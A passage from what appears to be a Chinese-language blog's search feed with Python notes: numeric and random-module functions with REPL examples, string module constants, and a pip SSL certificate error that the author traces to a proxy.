class="hljs-string">&#x27;&gt;&#x27;</span> <span class="hljs-keyword">not</span> supported <span class="hljs-keyword">between</span> instances <span class="hljs-keyword">of</span> <span class="hljs-string">&#x27;int&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;list&#x27;</span><br><span class="hljs-operator">&gt;&gt;</span><span class="hljs-operator">&gt;</span> <br></code></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-operator">&gt;&gt;</span><span class="hljs-operator">&gt;</span> <span class="hljs-built_in">max</span>([<span class="hljs-number">3</span>,<span class="hljs-number">6</span>],(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>))<br>Traceback (most recent <span class="hljs-keyword">call</span> <span class="hljs-keyword">last</span>):<br>  File &quot;&lt;python-input-255&gt;&quot;, line <span class="hljs-number">1</span>, <span class="hljs-keyword">in</span> <span class="hljs-operator">&lt;</span><span class="hljs-keyword">module</span><span class="hljs-operator">&gt;</span><br>    <span class="hljs-built_in">max</span>([<span class="hljs-number">3</span>,<span class="hljs-number">6</span>],(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>))<br>    <span class="hljs-operator">~</span><span class="hljs-operator">~</span><span class="hljs-operator">~</span><span class="hljs-operator">^</span><span class="hljs-operator">^</span><span class="hljs-operator">^</span><span class="hljs-operator">^</span><span class="hljs-operator">^</span><span class="hljs-operator">^</span><span class="hljs-operator">^</span><span class="hljs-operator">^</span><span class="hljs-operator">^</span><span class="hljs-operator">^</span><span class="hljs-operator">^</span><span class="hljs-operator">^</span><span class="hljs-operator">^</span><br>TypeError: <span class="hljs-string">&#x27;&gt;&#x27;</span> <span class="hljs-keyword">not</span> supported <span class="hljs-keyword">between</span> instances <span class="hljs-keyword">of</span> <span class="hljs-string">&#x27;tuple&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;list&#x27;</span><br></code></pre></td></tr></table></figure><p>参数为序列类型，返回值也是序列类型</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus">&gt;&gt;&gt; <span class="hljs-built_in">max</span>(<span class="hljs-selector-attr">[3,6]</span>,<span class="hljs-selector-attr">[6,4]</span>)<br><span class="hljs-selector-attr">[6, 4]</span><br></code></pre></td></tr></table></figure><h3 id="min-x"><a href="#min-x" class="headerlink" title="min(x)"></a>min(x)</h3><p>返回给定参数的最小值，参数可以为序列，也就是list\tuple\ditc等</p><h3 id="modf-x"><a href="#modf-x" class="headerlink" title="modf(x)"></a>modf(x)</h3><p>返回给定参数的小数部分和整数部分，整数部分以浮点型展示，元组类型</p><p>需要导入math模块</p><p>静态对象调用</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">xx = <span class="hljs-number">1</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">math.modf(xx)</span><br>(0.0, 1.0)<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">type</span>(math.modf(xx))</span><br>&lt;class &#x27;tuple&#x27;&gt;<br><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">yy = <span class="hljs-number">1.1111</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">math.modf(yy)</span><br>(0.11109999999999998, 1.0)<br></code></pre></td></tr></table></figure><h3 id="pow-x-y"><a href="#pow-x-y" class="headerlink" title="pow(x,y)"></a>pow(x,y)</h3><p>返回x**y的值，也就是x的y次幂</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">xx = <span class="hljs-number">1</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">yy = <span class="hljs-number">2</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">pow</span>(yy,xx)</span><br>2<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">zz = <span class="hljs-number">4</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">pow</span>(yy,zz)</span><br>16<br></code></pre></td></tr></table></figure><h3 id="round-x-n"><a href="#round-x-n" class="headerlink" title="round(x[,n])"></a>round(x[,n])</h3><p>返回x的四舍五入值，如果存在n参数，则表示保留n位小数</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">xx = <span class="hljs-number">1.23456</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">round</span>(xx)</span><br>1<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">round</span>(xx, <span class="hljs-number">3</span>)</span><br>1.235<br></code></pre></td></tr></table></figure><h3 id="sqrt-x"><a href="#sqrt-x" class="headerlink" title="sqrt(x)"></a>sqrt(x)</h3><p>返回数字x的平方根</p><p>需导入math模块</p><p>静态对象调用</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">zz = <span class="hljs-number">4</span></span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">math.sqrt(zz)</span><br>2.0<br></code></pre></td></tr></table></figure><h2 id="随机数函数"><a href="#随机数函数" class="headerlink" title="随机数函数"></a>随机数函数</h2><h3 id="choice-req"><a href="#choice-req" class="headerlink" title="choice(req)"></a>choice(req)</h3><p>返回参数req中随机值，req可以是列表、元组、字符串</p><p>需要导入random模块</p><p>静态对象调用</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-keyword">import</span> random</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">random.choice(<span class="hljs-string">&quot;thisistest&quot;</span>)</span><br>&#x27;t&#x27;<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">random.choice(<span class="hljs-string">&quot;thisistest&quot;</span>)</span><br>&#x27;t&#x27;<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">random.choice(<span class="hljs-string">&quot;thisistest&quot;</span>)</span><br>&#x27;e&#x27;<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">random.choice(<span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>))</span><br>8<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">random.choice(<span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>))</span><br>9<br></code></pre></td></tr></table></figure><h3 id="randrange-start-stop-step"><a href="#randrange-start-stop-step" class="headerlink" title="randrange([start,] stop [,step])"></a>randrange([start,] stop [,step])</h3><p>返回指定递增集合中的一个随机数，递增基数step默认是1</p><p>递增集合为[start, stop)，也就是包含start，不包含stop</p><p>需要导入random模块</p><p>静态对象调用</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">random.randrange(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)</span><br>1<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">random.randrange(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)</span><br>1<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">random.randrange(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)</span><br>1<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">random.randrange(<span class="hljs-number">1</span>,<span class="hljs-number">10</span>,<span class="hljs-number">2</span>)</span><br>9<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">random.randrange(<span class="hljs-number">1</span>,<span class="hljs-number">10</span>,<span class="hljs-number">2</span>)</span><br>3<br><br></code></pre></td></tr></table></figure><h3 id="random"><a href="#random" class="headerlink" title="random"></a>random</h3><p>从[0,1)中返回随机一个实数</p><p>需要导入random模块</p><p>静态对象调用</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs arcade">&gt;&gt;&gt; <span class="hljs-built_in">random</span>.<span class="hljs-built_in">random</span>()<br><span class="hljs-number">0.4513311385549199</span><br>&gt;&gt;&gt; <span class="hljs-built_in">random</span>.<span class="hljs-built_in">random</span>()<br><span class="hljs-number">0.6301650234546455</span><br>&gt;&gt;&gt; <span class="hljs-built_in">random</span>.<span class="hljs-built_in">random</span>()<br><span class="hljs-number">0.27458340961261607</span><br></code></pre></td></tr></table></figure><h3 id="seed-x"><a href="#seed-x" class="headerlink" title="seed([x])"></a>seed([x])</h3><p>改变随机数生成器的种子，可以在调用其他随机模块函数之前调用此函数，设置后，使用random.random()生成的随机数是固定的</p><p>需要导入 random 模块</p><p>静态对象调用</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"># 没有设置seed，每次生成的随机数都是随机的<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">random.random()</span><br>0.5780913011344704<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">random.random()</span><br>0.20609823213950174<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <br># 设置为同一个种子后，每次生成的随机数都是固定的<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">random.seed(<span class="hljs-number">1</span>)</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">random.random()</span><br>0.13436424411240122<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">random.seed(<span class="hljs-number">1</span>)</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">random.random()</span><br>0.13436424411240122<br><br># 更换种子后，生成的随机数会变化<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">random.seed(<span class="hljs-number">10</span>)</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">random.random()</span><br>0.5714025946899135<br></code></pre></td></tr></table></figure><h3 id="shuffle-序列"><a href="#shuffle-序列" class="headerlink" title="shuffle(序列)"></a>shuffle(序列)</h3><p>将序列中的元素随机排序</p><p>需要导入random模块</p><p>静态方法调用</p><p>返回值为 None</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-keyword">import</span> random</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">listtest = [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>]</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">random.shuffle(listtest)</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">print</span>(random.shuffle(listtest))</span><br>None<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(listtest))</span><br>&lt;class &#x27;list&#x27;&gt;<br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-built_in">print</span>(listtest)</span><br>[3, 1, 2]<br></code></pre></td></tr></table></figure><h3 id="uniform-x-y"><a href="#uniform-x-y" class="headerlink" title="uniform(x,y)"></a>uniform(x,y)</h3><p>生成指定范围内的实数，包含x和y</p><p>需要导入random模块</p><p>静态方法调用</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-keyword">import</span> random</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">random.uniform(<span class="hljs-number">1</span>,<span class="hljs-number">10</span>)</span><br>2.8548840892555156<br></code></pre></td></tr></table></figure><h2 id="三角函数"><a href="#三角函数" class="headerlink" title="三角函数"></a>三角函数</h2><h2 id="数学常量"><a href="#数学常量" class="headerlink" title="数学常量"></a>数学常量</h2><h3 id="pi"><a href="#pi" class="headerlink" title="pi"></a>pi</h3><p>数学常量 pi（圆周率，一般以π来表示）</p><h3 id="e"><a href="#e" class="headerlink" title="e"></a>e</h3><p>数学常量 e，e即自然常数（自然常数）</p><h1 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h1><p>单引号或双引号定义</p>]]></content>
    
    
    <categories>
      
      <category>dev</category>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>dev</tag>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python_module</title>
    <link href="/2024/11/11/dev/python3/python_module/"/>
    <url>/2024/11/11/dev/python3/python_module/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="string"><a href="#string" class="headerlink" title="string"></a>string</h2><h3 id="string-ascii-letters"><a href="#string-ascii-letters" class="headerlink" title="string.ascii_letters"></a>string.ascii_letters</h3><p>返回包含所有字母的字符串，包括大小写字母</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python-repl"><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python"><span class="hljs-keyword">import</span> string</span><br><span class="hljs-meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">string.ascii_letters</span><br>&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;<br></code></pre></td></tr></table></figure><h3 id="string-digits"><a href="#string-digits" class="headerlink" title="string.digits"></a>string.digits</h3><p>返回包含所有数字的字符串</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs delphi">&gt;&gt;&gt; <span class="hljs-keyword">string</span>.digits<br><span class="hljs-string">&#x27;0123456789&#x27;</span><br>&gt;&gt;&gt; <span class="hljs-keyword">type</span>(<span class="hljs-keyword">string</span>.digits)<br>&lt;<span class="hljs-keyword">class</span> <span class="hljs-string">&#x27;str&#x27;</span>&gt;<br></code></pre></td></tr></table></figure><h3 id="string-punctuation"><a href="#string-punctuation" class="headerlink" title="string.punctuation"></a>string.punctuation</h3><p>返回包含所有标点符号的字符串</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs 1c">&gt;&gt;&gt; string.punctuation<br>&#x27;!&quot;#$%&amp;\&#x27;<span class="hljs-punctuation">(</span><span class="hljs-punctuation">)</span>*<span class="hljs-punctuation">+</span><span class="hljs-punctuation">,</span><span class="hljs-punctuation">-</span>./<span class="hljs-punctuation">:</span><span class="hljs-punctuation">;</span>&lt;<span class="hljs-punctuation">=</span>&gt;?@[\\]^_`&#123;<span class="hljs-string">|&#125;~&#x27;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>dev</category>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>dev</tag>
      
      <tag>python</tag>
      
      <tag>tips</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python_env</title>
    <link href="/2024/11/11/dev/python3/python_env/"/>
    <url>/2024/11/11/dev/python3/python_env/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="update"><a href="#update" class="headerlink" title="update"></a>update</h2><h3 id="更新pip包"><a href="#更新pip包" class="headerlink" title="更新pip包"></a>更新pip包</h3><p>python3 -m pip install –upgrade pip</p><h2 id="error"><a href="#error" class="headerlink" title="error"></a>error</h2><h3 id="install-package-error"><a href="#install-package-error" class="headerlink" title="install package error"></a>install package error</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">➜  python3 -m pip install requests<br><span class="hljs-built_in">WARNING</span>: Retrying (Retry(total=<span class="hljs-number">4</span>, <span class="hljs-keyword">connect</span>=<span class="hljs-keyword">None</span>, <span class="hljs-keyword">read</span>=<span class="hljs-keyword">None</span>, redirect=<span class="hljs-keyword">None</span>, status=<span class="hljs-keyword">None</span>)) <span class="hljs-keyword">after</span> <span class="hljs-keyword">connection</span> broken <span class="hljs-keyword">by</span> <span class="hljs-string">&#x27;SSLError(SSLCertVerificationError(1, &#x27;</span>[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: unable <span class="hljs-keyword">to</span> <span class="hljs-keyword">get</span> <span class="hljs-keyword">local</span> issuer certificate (_ssl.c:<span class="hljs-number">1020</span>)<span class="hljs-string">&#x27;))&#x27;</span>: /simple/requests/<br><span class="hljs-built_in">WARNING</span>: Retrying (Retry(total=<span class="hljs-number">3</span>, <span class="hljs-keyword">connect</span>=<span class="hljs-keyword">None</span>, <span class="hljs-keyword">read</span>=<span class="hljs-keyword">None</span>, redirect=<span class="hljs-keyword">None</span>, status=<span class="hljs-keyword">None</span>)) <span class="hljs-keyword">after</span> <span class="hljs-keyword">connection</span> broken <span class="hljs-keyword">by</span> <span class="hljs-string">&#x27;SSLError(SSLCertVerificationError(1, &#x27;</span>[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: unable <span class="hljs-keyword">to</span> <span class="hljs-keyword">get</span> <span class="hljs-keyword">local</span> issuer certificate (_ssl.c:<span class="hljs-number">1020</span>)<span class="hljs-string">&#x27;))&#x27;</span>: /simple/requests/<br><span class="hljs-built_in">WARNING</span>: Retrying (Retry(total=<span class="hljs-number">2</span>, <span class="hljs-keyword">connect</span>=<span class="hljs-keyword">None</span>, <span class="hljs-keyword">read</span>=<span class="hljs-keyword">None</span>, redirect=<span class="hljs-keyword">None</span>, status=<span class="hljs-keyword">None</span>)) <span class="hljs-keyword">after</span> <span class="hljs-keyword">connection</span> broken <span class="hljs-keyword">by</span> <span class="hljs-string">&#x27;SSLError(SSLCertVerificationError(1, &#x27;</span>[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: unable <span class="hljs-keyword">to</span> <span class="hljs-keyword">get</span> <span class="hljs-keyword">local</span> issuer certificate (_ssl.c:<span class="hljs-number">1020</span>)<span class="hljs-string">&#x27;))&#x27;</span>: /simple/requests/<br><span class="hljs-built_in">WARNING</span>: Retrying (Retry(total=<span class="hljs-number">1</span>, <span class="hljs-keyword">connect</span>=<span class="hljs-keyword">None</span>, <span class="hljs-keyword">read</span>=<span class="hljs-keyword">None</span>, redirect=<span class="hljs-keyword">None</span>, status=<span class="hljs-keyword">None</span>)) <span class="hljs-keyword">after</span> <span class="hljs-keyword">connection</span> broken <span class="hljs-keyword">by</span> <span class="hljs-string">&#x27;SSLError(SSLCertVerificationError(1, &#x27;</span>[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: unable <span class="hljs-keyword">to</span> <span class="hljs-keyword">get</span> <span class="hljs-keyword">local</span> issuer certificate (_ssl.c:<span class="hljs-number">1020</span>)<span class="hljs-string">&#x27;))&#x27;</span>: /simple/requests/<br><span class="hljs-built_in">WARNING</span>: Retrying (Retry(total=<span class="hljs-number">0</span>, <span class="hljs-keyword">connect</span>=<span class="hljs-keyword">None</span>, <span class="hljs-keyword">read</span>=<span class="hljs-keyword">None</span>, redirect=<span class="hljs-keyword">None</span>, status=<span class="hljs-keyword">None</span>)) <span class="hljs-keyword">after</span> <span class="hljs-keyword">connection</span> broken <span class="hljs-keyword">by</span> <span class="hljs-string">&#x27;SSLError(SSLCertVerificationError(1, &#x27;</span>[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: unable <span class="hljs-keyword">to</span> <span class="hljs-keyword">get</span> <span class="hljs-keyword">local</span> issuer certificate (_ssl.c:<span class="hljs-number">1020</span>)<span class="hljs-string">&#x27;))&#x27;</span>: /simple/requests/<br>Could <span class="hljs-keyword">not</span> <span class="hljs-keyword">fetch</span> URL https://pypi.org/simple/requests/: There was a problem confirming the ssl certificate: HTTPSConnectionPool(host=<span class="hljs-string">&#x27;pypi.org&#x27;</span>, port=<span class="hljs-number">443</span>): Max retries exceeded <span class="hljs-keyword">with</span> url: /simple/requests/ (Caused <span class="hljs-keyword">by</span> SSLError(SSLCertVerificationError(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: unable to get local issuer certificate (_ssl.c:1020)&#x27;</span>))) - skipping<br>ERROR: Could <span class="hljs-keyword">not</span> find a <span class="hljs-keyword">version</span> that satisfies the requirement requests (<span class="hljs-keyword">from</span> versions: <span class="hljs-keyword">none</span>)<br>Could <span class="hljs-keyword">not</span> <span class="hljs-keyword">fetch</span> URL https://pypi.org/simple/pip/: There was a problem confirming the ssl certificate: HTTPSConnectionPool(host=<span class="hljs-string">&#x27;pypi.org&#x27;</span>, port=<span class="hljs-number">443</span>): Max retries exceeded <span class="hljs-keyword">with</span> url: /simple/pip/ (Caused <span class="hljs-keyword">by</span> SSLError(SSLCertVerificationError(<span class="hljs-number">1</span>, <span class="hljs-string">&#x27;[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: unable to get local issuer certificate (_ssl.c:1020)&#x27;</span>))) - skipping<br>ERROR: <span class="hljs-keyword">No</span> matching distribution <span class="hljs-built_in">found</span> <span class="hljs-keyword">for</span> requests<br></code></pre></td></tr></table></figure><h3 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h3><p>可能是代理问题，关闭代理</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">➜  code python3 -m pip install requests<br>Collecting requests<br>  Downloading requests<span class="hljs-number">-2.32</span><span class="hljs-number">.3</span>-py3-<span class="hljs-keyword">none</span>-<span class="hljs-keyword">any</span>.whl.metadata (<span class="hljs-number">4.6</span> kB)<br>Collecting charset-normalizer&lt;<span class="hljs-number">4</span>,&gt;=<span class="hljs-number">2</span> (<span class="hljs-keyword">from</span> requests)<br>  Downloading charset_normalizer<span class="hljs-number">-3.4</span><span class="hljs-number">.0</span>-cp313-cp313-macosx_11_0_arm64.whl.metadata (<span class="hljs-number">34</span> kB)<br>Collecting idna&lt;<span class="hljs-number">4</span>,&gt;=<span class="hljs-number">2.5</span> (<span class="hljs-keyword">from</span> requests)<br>  Downloading idna<span class="hljs-number">-3.10</span>-py3-<span class="hljs-keyword">none</span>-<span class="hljs-keyword">any</span>.whl.metadata (<span class="hljs-number">10</span> kB)<br>Collecting urllib3&lt;<span class="hljs-number">3</span>,&gt;=<span class="hljs-number">1.21</span><span class="hljs-number">.1</span> (<span class="hljs-keyword">from</span> requests)<br>  Downloading urllib3<span class="hljs-number">-2.2</span><span class="hljs-number">.3</span>-py3-<span class="hljs-keyword">none</span>-<span class="hljs-keyword">any</span>.whl.metadata (<span class="hljs-number">6.5</span> kB)<br>Collecting certifi&gt;=<span class="hljs-number">2017.4</span><span class="hljs-number">.17</span> (<span class="hljs-keyword">from</span> requests)<br>  Downloading certifi<span class="hljs-number">-2024.8</span><span class="hljs-number">.30</span>-py3-<span class="hljs-keyword">none</span>-<span class="hljs-keyword">any</span>.whl.metadata (<span class="hljs-number">2.2</span> kB)<br>Downloading requests<span class="hljs-number">-2.32</span><span class="hljs-number">.3</span>-py3-<span class="hljs-keyword">none</span>-<span class="hljs-keyword">any</span>.whl (<span class="hljs-number">64</span> kB)<br>Downloading certifi<span class="hljs-number">-2024.8</span><span class="hljs-number">.30</span>-py3-<span class="hljs-keyword">none</span>-<span class="hljs-keyword">any</span>.whl (<span class="hljs-number">167</span> kB)<br>Downloading charset_normalizer<span class="hljs-number">-3.4</span><span class="hljs-number">.0</span>-cp313-cp313-macosx_11_0_arm64.whl (<span class="hljs-number">119</span> kB)<br>Downloading idna<span class="hljs-number">-3.10</span>-py3-<span class="hljs-keyword">none</span>-<span class="hljs-keyword">any</span>.whl (<span class="hljs-number">70</span> kB)<br>Downloading urllib3<span class="hljs-number">-2.2</span><span class="hljs-number">.3</span>-py3-<span class="hljs-keyword">none</span>-<span class="hljs-keyword">any</span>.whl (<span class="hljs-number">126</span> kB)<br>Installing collected packages: urllib3, idna, charset-normalizer, certifi, requests<br>  <span class="hljs-built_in">WARNING</span>: The script normalizer <span class="hljs-keyword">is</span> installed <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;/Library/Frameworks/Python.framework/Versions/3.13/bin&#x27;</span> which <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">on</span> <span class="hljs-type">PATH</span>.<br>  Consider adding this directory <span class="hljs-keyword">to</span> <span class="hljs-type">PATH</span> <span class="hljs-keyword">or</span>, <span class="hljs-keyword">if</span> you prefer <span class="hljs-keyword">to</span> suppress this <span class="hljs-built_in">warning</span>, use <span class="hljs-comment">--no-warn-script-location.</span><br>Successfully installed certifi<span class="hljs-number">-2024.8</span><span class="hljs-number">.30</span> charset-normalizer<span class="hljs-number">-3.4</span><span class="hljs-number">.0</span> idna<span class="hljs-number">-3.10</span> requests<span class="hljs-number">-2.32</span><span class="hljs-number">.3</span> urllib3<span class="hljs-number">-2.2</span><span class="hljs-number">.3</span><br><br>[<span class="hljs-keyword">notice</span>] A <span class="hljs-built_in">new</span> <span class="hljs-keyword">release</span> <span class="hljs-keyword">of</span> pip <span class="hljs-keyword">is</span> available: <span class="hljs-number">24.2</span> -&gt; <span class="hljs-number">24.3</span><span class="hljs-number">.1</span><br>[<span class="hljs-keyword">notice</span>] <span class="hljs-keyword">To</span> <span class="hljs-keyword">update</span>, run: python3 -m pip install <span class="hljs-comment">--upgrade pip</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>dev</category>
      
      <category>python</category>
      
    </categories>
    
    
    <tags>
      
      <tag>dev</tag>
      
      <tag>python</tag>
      
      <tag>tips</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>exceltips</title>
    <link href="/2024/10/29/yunwei/yunweitips/exceltips/"/>
    <url>/2024/10/29/yunwei/yunweitips/exceltips/</url>
    
